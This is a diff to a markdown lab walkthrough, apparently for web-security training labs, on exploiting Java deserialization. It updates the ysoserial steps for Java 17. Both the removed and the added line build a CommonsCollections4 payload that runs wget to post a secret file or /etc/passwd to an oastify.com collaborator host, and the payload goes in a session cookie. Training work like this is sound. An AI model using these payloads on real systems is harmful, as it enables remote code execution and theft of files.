@@ -4533,11 +4533,11 @@ java --version
 
 ![Switch Java version](images/switch-java-version.png)  
   
->Now execute ```ysoserial``` to generate base64 payload, using Java version 11. Replace session cookie with generated base64 payload and URL encode only the key characters before sending request.  
+>Now execute ```ysoserial``` to generate base64 payload, using Java version 17. Replace session cookie with generated base64 payload and **URL encode** only the key characters before sending request.  
 
 ```bash
-java -jar /opt/ysoserial/ysoserial.jar CommonsCollections4 'wget http://OASTIFY.COM --post-file=/home/carlos/secret' | base64 -w 0
-```  
+java --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.trax=ALL-UNNAMED --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.runtime=ALL-UNNAMED --add-opens=java.base/java.net=ALL-UNNAMED --add-opens=java.base/java.util=ALL-UNNAMED -jar ysoserial-all.jar CommonsCollections4 'wget http://jk7yarxli6l788maxadv0rxdj4pvdm1b.oastify.com --post-file=/etc/passwd' | base64 -w 0
+```
 
 ![ysoserial Command](images/ysoserial-command.png)  
 
